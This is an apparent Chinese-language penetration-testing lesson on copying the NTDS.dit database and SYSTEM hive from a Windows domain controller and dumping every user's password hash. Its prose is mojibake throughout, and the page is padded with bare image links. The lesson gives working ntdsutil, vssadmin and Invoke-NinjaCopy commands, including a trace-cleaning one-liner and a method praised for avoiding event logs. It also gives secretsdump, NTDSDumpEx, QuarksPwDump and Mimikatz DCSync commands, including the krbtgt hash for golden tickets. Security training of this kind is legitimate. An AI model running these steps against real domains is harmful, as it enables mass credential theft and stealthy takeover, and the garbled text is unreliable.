![](img/b292be86923c54fb2de0acb80b573d30_1.png)

![](img/b292be86923c54fb2de0acb80b573d30_3.png)

![](img/b292be86923c54fb2de0acb80b573d30_5.png)

![](img/b292be86923c54fb2de0acb80b573d30_7.png)

![](img/b292be86923c54fb2de0acb80b573d30_9.png)

![](img/b292be86923c54fb2de0acb80b573d30_11.png)

# è¯¾ç¨‹P57ï¼šç¬¬22å¤© - åŸŸå†…å¯†ç å‡­è¯è·å–åŠè§£å¯† ğŸ”

![](img/b292be86923c54fb2de0acb80b573d30_13.png)

![](img/b292be86923c54fb2de0acb80b573d30_14.png)

![](img/b292be86923c54fb2de0acb80b573d30_16.png)

åœ¨æœ¬èŠ‚è¯¾ä¸­ï¼Œæˆ‘ä»¬å°†å­¦ä¹ å¦‚ä½•ä»åŸŸæ§åˆ¶å™¨ä¸­è·å–å­˜å‚¨æ‰€æœ‰åŸŸç”¨æˆ·å¯†ç å“ˆå¸Œçš„å…³é”®æ–‡ä»¶ï¼ˆNTDS.ditï¼‰ï¼Œå¹¶æŒæ¡å¤šç§è§£å¯†è¯¥æ–‡ä»¶ä»¥æå–å“ˆå¸Œå€¼çš„æ–¹æ³•ã€‚è¿™æ˜¯åŸŸæ¸—é€ä¸­è·å–å‡­è¯ã€è¿›è¡Œæ¨ªå‘ç§»åŠ¨å’Œæƒé™ç»´æŒçš„å…³é”®æ­¥éª¤ã€‚

![](img/b292be86923c54fb2de0acb80b573d30_18.png)

![](img/b292be86923c54fb2de0acb80b573d30_20.png)

![](img/b292be86923c54fb2de0acb80b573d30_22.png)

![](img/b292be86923c54fb2de0acb80b573d30_24.png)

![](img/b292be86923c54fb2de0acb80b573d30_26.png)

---

![](img/b292be86923c54fb2de0acb80b573d30_28.png)

## æ¦‚è¿°

![](img/b292be86923c54fb2de0acb80b573d30_30.png)

![](img/b292be86923c54fb2de0acb80b573d30_32.png)

æ´»åŠ¨ç›®å½•æ•°æ®åº“æ–‡ä»¶ `NTDS.dit` å­˜å‚¨ç€åŸŸå†…æ‰€æœ‰ç”¨æˆ·ã€ç»„åŠå…¶å¯†ç å“ˆå¸Œç­‰æ ¸å¿ƒä¿¡æ¯ã€‚ç”±äºWindowsç³»ç»Ÿä¼šé˜»æ­¢å¯¹è¯¥æ–‡ä»¶çš„ç›´æ¥è®¿é—®å’Œå¤åˆ¶ï¼Œæˆ‘ä»¬éœ€è¦åˆ©ç”¨ç‰¹æ®Šçš„æŠ€æœ¯æ¥è·å–å®ƒã€‚è·å–æ–‡ä»¶åï¼Œè¿˜éœ€ä½¿ç”¨ç‰¹å®šå·¥å…·è§£å¯†æ‰èƒ½å¾—åˆ°å¯ç”¨çš„å¯†ç å“ˆå¸Œã€‚

ä¸Šä¸€èŠ‚æˆ‘ä»¬ä»‹ç»äº†åŸŸå†…ä¿¡æ¯æ”¶é›†çš„åŸºæœ¬æ–¹æ³•ï¼Œæœ¬èŠ‚ä¸­æˆ‘ä»¬æ¥çœ‹çœ‹å¦‚ä½•è·å–å¹¶è§£å¯†è¿™ä¸ªæ ¸å¿ƒçš„å‡­è¯æ•°æ®åº“ã€‚

![](img/b292be86923c54fb2de0acb80b573d30_34.png)

---

![](img/b292be86923c54fb2de0acb80b573d30_36.png)

![](img/b292be86923c54fb2de0acb80b573d30_38.png)

![](img/b292be86923c54fb2de0acb80b573d30_40.png)

## ç¬¬ä¸€éƒ¨åˆ†ï¼šè·å–NTDS.ditæ–‡ä»¶

![](img/b292be86923c54fb2de0acb80b573d30_42.png)

`NTDS.dit` æ–‡ä»¶é»˜è®¤ä½äºåŸŸæ§åˆ¶å™¨çš„ `C:\Windows\NTDS\` ç›®å½•ä¸‹ã€‚Windowsä¼šé”å®šæ­¤æ–‡ä»¶ï¼Œé˜»æ­¢ç›´æ¥å¤åˆ¶ã€‚å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦åˆ©ç”¨â€œå·å½±å¤åˆ¶æœåŠ¡â€ï¼ˆVolume Shadow Copy Service, VSSï¼‰æ¥åˆ›å»ºè¯¥æ–‡ä»¶çš„å‰¯æœ¬ã€‚

ä»¥ä¸‹æ˜¯å‡ ç§åˆ©ç”¨VSSè·å–æ–‡ä»¶çš„æ–¹æ³•ï¼š

![](img/b292be86923c54fb2de0acb80b573d30_44.png)

### 1. ä½¿ç”¨ ntdsutil å·¥å…·

`ntdsutil` æ˜¯Windowsè‡ªå¸¦çš„Active Directoryç®¡ç†å‘½ä»¤è¡Œå·¥å…·ï¼Œå¯ç”¨äºåˆ›å»ºå¿«ç…§å¹¶å¤åˆ¶æ–‡ä»¶ã€‚

![](img/b292be86923c54fb2de0acb80b573d30_46.png)

![](img/b292be86923c54fb2de0acb80b573d30_48.png)

![](img/b292be86923c54fb2de0acb80b573d30_50.png)

**äº¤äº’å¼æ–¹æ³•ï¼ˆç†è§£æµç¨‹ï¼‰ï¼š**
æ‰“å¼€å‘½ä»¤æç¤ºç¬¦ï¼ˆcmdï¼‰ï¼ŒæŒ‰é¡ºåºæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š
```cmd
ntdsutil
snapshot
activate instance ntds
create
mount {å¿«ç…§GUID}
```
æ‰§è¡Œ `mount` å‘½ä»¤åï¼Œç³»ç»Ÿä¼šè¿”å›ä¸€ä¸ªæŒ‚è½½è·¯å¾„ï¼ˆå¦‚ `C:\$SNAP_202203211134_VOLUMEC$\`ï¼‰ã€‚é€šè¿‡æ­¤è·¯å¾„å³å¯è®¿é—®å¹¶å¤åˆ¶ `NTDS.dit` æ–‡ä»¶ã€‚æ“ä½œå®Œæˆåï¼Œéœ€å¸è½½å¹¶åˆ é™¤å¿«ç…§ï¼š
```cmd
unmount {å¿«ç…§GUID}
delete {å¿«ç…§GUID}
quit
quit
```

**éäº¤äº’å¼æ–¹æ³•ï¼ˆå®æˆ˜å¸¸ç”¨ï¼‰ï¼š**
ä»¥ä¸‹å‘½ä»¤å¯ä¸€è¡Œå®Œæˆåˆ›å»ºå¿«ç…§ã€å¤åˆ¶æ–‡ä»¶ã€æ¸…ç†ç—•è¿¹çš„æ“ä½œï¼š
```cmd
ntdsutil "ac i ntds" "snapshot" "create" "mount {GUID}" "copy C:\$SNAP_{GUID}_VOLUMEC$\Windows\NTDS\ntds.dit C:\ntds.dit" "unmount {GUID}" "delete {GUID}" quit quit
```

![](img/b292be86923c54fb2de0acb80b573d30_52.png)

### 2. ä½¿ç”¨ vssadmin å·¥å…·

![](img/b292be86923c54fb2de0acb80b573d30_54.png)

`vssadmin` åŒæ ·æ˜¯ç³»ç»Ÿè‡ªå¸¦çš„å·å½±å‰¯æœ¬æœåŠ¡ç®¡ç†å·¥å…·ã€‚

ä»¥ä¸‹æ˜¯ä½¿ç”¨æ­¥éª¤ï¼š
1.  åˆ—å‡ºå·²æœ‰å¿«ç…§ï¼š`vssadmin list shadows`
2.  ä¸ºç³»ç»Ÿç›˜åˆ›å»ºæ–°å¿«ç…§ï¼š`vssadmin create shadow /for=C:`
3.  å¤åˆ¶æ–‡ä»¶ã€‚å‘½ä»¤ä¼šè¿”å›â€œå·å½±å‰¯æœ¬è£…è½½ç‚¹â€ï¼ˆå¦‚ `\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1`ï¼‰ã€‚ä½¿ç”¨copyå‘½ä»¤å¤åˆ¶æ–‡ä»¶ï¼š
    ```cmd
    copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\ntds.dit
    ```
4.  åˆ é™¤å¿«ç…§ï¼š`vssadmin delete shadows /shadow={å¿«ç…§ID}`

![](img/b292be86923c54fb2de0acb80b573d30_56.png)

![](img/b292be86923c54fb2de0acb80b573d30_58.png)

![](img/b292be86923c54fb2de0acb80b573d30_60.png)

![](img/b292be86923c54fb2de0acb80b573d30_61.png)

### 3. ä½¿ç”¨ diskshadow å·¥å…·

![](img/b292be86923c54fb2de0acb80b573d30_63.png)

![](img/b292be86923c54fb2de0acb80b573d30_65.png)

`diskshadow` æ˜¯å¾®è½¯å®˜æ–¹å·¥å…·ï¼ŒåŠŸèƒ½å¼ºå¤§ã€‚é€šå¸¸éœ€è¦ä»Windows SDKä¸­è·å–æˆ–ä½¿ç”¨é¢„ç¼–è¯‘ç‰ˆæœ¬ã€‚

åŸºæœ¬ä½¿ç”¨å‘½ä»¤å¦‚ä¸‹ï¼š
```cmd
diskshadow /s script.txt
```
å…¶ä¸­ `script.txt` æ–‡ä»¶å†…å®¹åŒ…å«åˆ›å»ºå¿«ç…§ã€æš´éœ²å·ã€å¤åˆ¶æ–‡ä»¶çš„æŒ‡ä»¤ã€‚

### 4. ä½¿ç”¨ NinjaCopy (PowerShellè„šæœ¬)

![](img/b292be86923c54fb2de0acb80b573d30_67.png)

![](img/b292be86923c54fb2de0acb80b573d30_69.png)

![](img/b292be86923c54fb2de0acb80b573d30_71.png)

`Invoke-NinjaCopy` æ˜¯ä¸€ä¸ªPowerShellè„šæœ¬ï¼Œå®ƒä¸ä¾èµ–VSSæœåŠ¡ï¼Œå› æ­¤ä¸ä¼šäº§ç”Ÿç›¸å…³äº‹ä»¶æ—¥å¿—ï¼Œæ›´ä¸ºéšè”½ã€‚

![](img/b292be86923c54fb2de0acb80b573d30_73.png)

![](img/b292be86923c54fb2de0acb80b573d30_75.png)

![](img/b292be86923c54fb2de0acb80b573d30_77.png)

![](img/b292be86923c54fb2de0acb80b573d30_78.png)

![](img/b292be86923c54fb2de0acb80b573d30_80.png)

![](img/b292be86923c54fb2de0acb80b573d30_82.png)

**åœ¨CSä¸­åŠ è½½å¹¶ä½¿ç”¨ï¼š**
1.  å°†è„šæœ¬ä¸Šä¼ åˆ°ç›®æ ‡ä¸»æœºï¼Œæˆ–åœ¨CSä¸­è¿œç¨‹åŠ è½½ï¼š
    ```powershell
    powershell-import /path/to/Invoke-NinjaCopy.ps1
    ```
2.  æ‰§è¡Œè„šæœ¬å¤åˆ¶æ–‡ä»¶ï¼š
    ```powershell
    powershell Invoke-NinjaCopy -Path "C:\Windows\NTDS\ntds.dit" -LocalDestination "C:\ntds.dit"
    ```
    åŒæ ·å¯ä»¥å¤åˆ¶ `SYSTEM` æ³¨å†Œè¡¨æ–‡ä»¶ï¼š`-Path "C:\Windows\System32\config\SYSTEM"`

![](img/b292be86923c54fb2de0acb80b573d30_83.png)

![](img/b292be86923c54fb2de0acb80b573d30_85.png)

![](img/b292be86923c54fb2de0acb80b573d30_87.png)

![](img/b292be86923c54fb2de0acb80b573d30_89.png)

![](img/b292be86923c54fb2de0acb80b573d30_90.png)

![](img/b292be86923c54fb2de0acb80b573d30_92.png)

![](img/b292be86923c54fb2de0acb80b573d30_94.png)

**æ³¨æ„ï¼š** è§£å¯† `NTDS.dit` é€šå¸¸éœ€è¦åŒæ—¶è·å– `SYSTEM` æ³¨å†Œè¡¨æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«è§£å¯†æ‰€éœ€çš„å¯†é’¥ã€‚

![](img/b292be86923c54fb2de0acb80b573d30_96.png)

![](img/b292be86923c54fb2de0acb80b573d30_98.png)

![](img/b292be86923c54fb2de0acb80b573d30_100.png)

![](img/b292be86923c54fb2de0acb80b573d30_102.png)

![](img/b292be86923c54fb2de0acb80b573d30_104.png)

![](img/b292be86923c54fb2de0acb80b573d30_106.png)

![](img/b292be86923c54fb2de0acb80b573d30_108.png)

---

![](img/b292be86923c54fb2de0acb80b573d30_110.png)

![](img/b292be86923c54fb2de0acb80b573d30_112.png)

![](img/b292be86923c54fb2de0acb80b573d30_114.png)

## ç¬¬äºŒéƒ¨åˆ†ï¼šè§£å¯†NTDS.ditæ–‡ä»¶

è·å– `NTDS.dit` å’Œ `SYSTEM` æ–‡ä»¶åï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨å·¥å…·ä»ä¸­æå–ç”¨æˆ·å¯†ç å“ˆå¸Œã€‚

![](img/b292be86923c54fb2de0acb80b573d30_116.png)

![](img/b292be86923c54fb2de0acb80b573d30_118.png)

![](img/b292be86923c54fb2de0acb80b573d30_119.png)

![](img/b292be86923c54fb2de0acb80b573d30_121.png)

![](img/b292be86923c54fb2de0acb80b573d30_123.png)

![](img/b292be86923c54fb2de0acb80b573d30_125.png)

![](img/b292be86923c54fb2de0acb80b573d30_126.png)

### 1. ä½¿ç”¨ Quarks PwDump

![](img/b292be86923c54fb2de0acb80b573d30_128.png)

![](img/b292be86923c54fb2de0acb80b573d30_130.png)

![](img/b292be86923c54fb2de0acb80b573d30_132.png)

è¿™æ˜¯ä¸€ä¸ªWindowså‡­æ®æå–å·¥å…·ï¼Œå¯ä»¥ç¦»çº¿å¤„ç† `NTDS.dit` æ–‡ä»¶ã€‚
```cmd
QuarksPwDump.exe --dump-hash-domain --ntds-file c:\ntds.dit --output ntds-hashes.txt
```

### 2. ä½¿ç”¨ Impacket å¥—ä»¶ä¸­çš„ secretsdump.py

![](img/b292be86923c54fb2de0acb80b573d30_134.png)

![](img/b292be86923c54fb2de0acb80b573d30_135.png)

Impacketæ˜¯æ¸—é€æµ‹è¯•ä¸­å¸¸ç”¨çš„Pythonå·¥å…·é›†ã€‚`secretsdump.py` å¯ä»¥è§£ææœ¬åœ°æ–‡ä»¶ã€‚
```bash
python3 secretsdump.py -system SYSTEM.reg -ntds ntds.dit LOCAL
```
æˆ–è€…ä½¿ç”¨ç¼–è¯‘å¥½çš„exeç‰ˆæœ¬ï¼š
```cmd
secretsdump.exe -system SYSTEM.reg -ntds ntds.dit LOCAL
```

![](img/b292be86923c54fb2de0acb80b573d30_137.png)

![](img/b292be86923c54fb2de0acb80b573d30_139.png)

### 3. ä½¿ç”¨ NTDSDumpEx

è¿™æ˜¯ä¸€ä¸ªé«˜æ•ˆçš„ä¸“ç”¨å·¥å…·ï¼Œå¯ä»¥å¿«é€Ÿæå–ä¿¡æ¯ã€‚
```cmd
NTDSDumpEx.exe -d ntds.dit -s SYSTEM.reg -o hashes.txt
```

![](img/b292be86923c54fb2de0acb80b573d30_141.png)

### 4. ä½¿ç”¨ Mimikatz (DCSyncæ”»å‡» - åœ¨çº¿æå–)

![](img/b292be86923c54fb2de0acb80b573d30_143.png)

![](img/b292be86923c54fb2de0acb80b573d30_145.png)

![](img/b292be86923c54fb2de0acb80b573d30_147.png)

![](img/b292be86923c54fb2de0acb80b573d30_149.png)

![](img/b292be86923c54fb2de0acb80b573d30_151.png)

![](img/b292be86923c54fb2de0acb80b573d30_153.png)

![](img/b292be86923c54fb2de0acb80b573d30_155.png)

æ— éœ€ä¸‹è½½æ–‡ä»¶ï¼ŒMimikatzå¯ä»¥åˆ©ç”¨åŸŸæ§åˆ¶å™¨åŒæ­¥åè®®ï¼ˆDCSyncï¼‰ç›´æ¥ä»åœ¨çº¿åŸŸæ§æ‹‰å–æŒ‡å®šç”¨æˆ·çš„å“ˆå¸Œã€‚

![](img/b292be86923c54fb2de0acb80b573d30_157.png)

![](img/b292be86923c54fb2de0acb80b573d30_159.png)

![](img/b292be86923c54fb2de0acb80b573d30_161.png)

![](img/b292be86923c54fb2de0acb80b573d30_162.png)

![](img/b292be86923c54fb2de0acb80b573d30_164.png)

![](img/b292be86923c54fb2de0acb80b573d30_165.png)

![](img/b292be86923c54fb2de0acb80b573d30_166.png)

![](img/b292be86923c54fb2de0acb80b573d30_167.png)

![](img/b292be86923c54fb2de0acb80b573d30_168.png)

![](img/b292be86923c54fb2de0acb80b573d30_170.png)

![](img/b292be86923c54fb2de0acb80b573d30_172.png)

![](img/b292be86923c54fb2de0acb80b573d30_173.png)

**åœ¨CSä¸­æ‰§è¡ŒMimikatzå‘½ä»¤ï¼š**
-   è·å–åŸŸå†…æ‰€æœ‰ç”¨æˆ·å“ˆå¸Œï¼š
    ```cmd
    mimikatz lsadump::dcsync /domain:mingy.com /all /csv
    ```
-   è·å–ç‰¹å®šç”¨æˆ·ï¼ˆå¦‚krbtgtï¼‰çš„å“ˆå¸Œï¼ˆç”¨äºé»„é‡‘ç¥¨æ®æ”»å‡»ï¼‰ï¼š
    ```cmd
    mimikatz lsadump::dcsync /domain:mingy.com /user:krbtgt
    ```

![](img/b292be86923c54fb2de0acb80b573d30_175.png)

![](img/b292be86923c54fb2de0acb80b573d30_176.png)

![](img/b292be86923c54fb2de0acb80b573d30_178.png)

![](img/b292be86923c54fb2de0acb80b573d30_180.png)

![](img/b292be86923c54fb2de0acb80b573d30_182.png)

**æ³¨æ„ï¼š** DCSyncæ”»å‡»éœ€è¦åŸŸç”¨æˆ·æƒé™ï¼Œä¸”è¯¥ç”¨æˆ·æ‹¥æœ‰å¤åˆ¶ç›®å½•æ›´æ”¹çš„æƒé™ï¼ˆé»˜è®¤åŸŸç®¡ç†å‘˜ç»„æœ‰æ­¤æƒé™ï¼‰ã€‚

![](img/b292be86923c54fb2de0acb80b573d30_184.png)

![](img/b292be86923c54fb2de0acb80b573d30_186.png)

![](img/b292be86923c54fb2de0acb80b573d30_187.png)

---

![](img/b292be86923c54fb2de0acb80b573d30_189.png)

![](img/b292be86923c54fb2de0acb80b573d30_191.png)

## æ€»ç»“

![](img/b292be86923c54fb2de0acb80b573d30_193.png)

![](img/b292be86923c54fb2de0acb80b573d30_195.png)

æœ¬èŠ‚è¯¾æˆ‘ä»¬ä¸€èµ·å­¦ä¹ äº†åŸŸæ¸—é€ä¸­è·å–å¯†ç å‡­è¯çš„æ ¸å¿ƒæŠ€æœ¯ã€‚é¦–å…ˆï¼Œæˆ‘ä»¬äº†è§£äº† `NTDS.dit` æ–‡ä»¶çš„é‡è¦æ€§åŠå…¶å—ä¿æŠ¤çš„ç‰¹æ€§ã€‚æ¥ç€ï¼Œæˆ‘ä»¬æŒæ¡äº†å¤šç§ç»•è¿‡ä¿æŠ¤ã€è·å–è¯¥æ–‡ä»¶çš„æ–¹æ³•ï¼ŒåŒ…æ‹¬ä½¿ç”¨ `ntdsutil`ã€`vssadmin`ã€`diskshadow` ç­‰ç³»ç»Ÿå·¥å…·ä»¥åŠ `Invoke-NinjaCopy` PowerShellè„šæœ¬ã€‚æœ€åï¼Œæˆ‘ä»¬å­¦ä¹ äº†ä½¿ç”¨ `Quarks PwDump`ã€`Impacket-secretsdump`ã€`NTDSDumpEx` ç­‰å·¥å…·è§£å¯†æ–‡ä»¶ï¼Œä»¥åŠåˆ©ç”¨ `Mimikatz` è¿›è¡Œåœ¨çº¿DCSyncæ”»å‡»æ¥ç›´æ¥æå–å“ˆå¸Œå€¼ã€‚

![](img/b292be86923c54fb2de0acb80b573d30_197.png)

![](img/b292be86923c54fb2de0acb80b573d30_199.png)

![](img/b292be86923c54fb2de0acb80b573d30_201.png)

è·å–åˆ°çš„åŸŸç”¨æˆ·å¯†ç å“ˆå¸Œæ˜¯åç»­è¿›è¡Œæ¨ªå‘ç§»åŠ¨ã€æƒé™ç»´æŒï¼ˆå¦‚ç¥¨æ®æ”»å‡»ï¼‰çš„åŸºç¡€ã€‚è¯·åŠ¡å¿…åœ¨æˆæƒç¯å¢ƒä¸‹ç»ƒä¹ è¿™äº›æŠ€æœ¯ï¼Œå¹¶ç†è§£å…¶åŸç†ã€‚